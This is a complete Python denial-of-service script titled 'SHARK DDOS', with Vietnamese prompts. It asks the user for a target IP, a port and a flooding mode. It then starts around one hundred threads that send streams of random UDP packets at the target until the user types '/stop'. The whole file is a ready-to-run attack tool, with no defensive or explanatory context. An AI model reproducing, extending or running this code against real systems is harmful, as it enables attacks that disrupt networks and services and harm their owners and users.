import socket
import threading
import os

running = False
threads = []

def print_banner():
    green = "\033[92m"
    italic = "\033[3m"
    reset = "\033[0m"
    banner = f"""{green}{italic}
╔══════════════════════╗
║     SHARK DDOS 🦈     ║
╚══════════════════════╝
{reset}"""
    print(banner)

def send(ip, port, packet_size):
    while running:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.sendto(os.urandom(packet_size), (ip, port))
            s.close()
        except:
            pass

def start_attack(ip, port, method):
    global running, threads
    running = True
    threads = []

    if method == "UDP-Flood":
        for _ in range(100):
            t = threading.Thread(target=send, args=(ip, port, 375))
            t.start()
            threads.append(t)

    elif method == "UDP-Power":
        for _ in range(100):
            t = threading.Thread(target=send, args=(ip, port, 1450))
            t.start()
            threads.append(t)

    elif method == "UDP-Mix":
        for _ in range(50):
            t1 = threading.Thread(target=send, args=(ip, port, 375))
            t2 = threading.Thread(target=send, args=(ip, port, 1450))
            t1.start(); t2.start()
            threads.extend([t1, t2])

def stop_attack():
    global running
    running = False

def main():
    print_banner()
    ip = input("IP: ")
    port = int(input("Port: "))
    method = input("Kiểu (UDP-Flood / UDP-Power / UDP-Mix): ")

    start_attack(ip, port, method)
    print("Đang tấn công... Gõ /stop để ngừng.")

    while True:
        cmd = input()
        if cmd.strip() == "/stop":
            stop_attack()
            print("Đã dừng.")
            break

main()
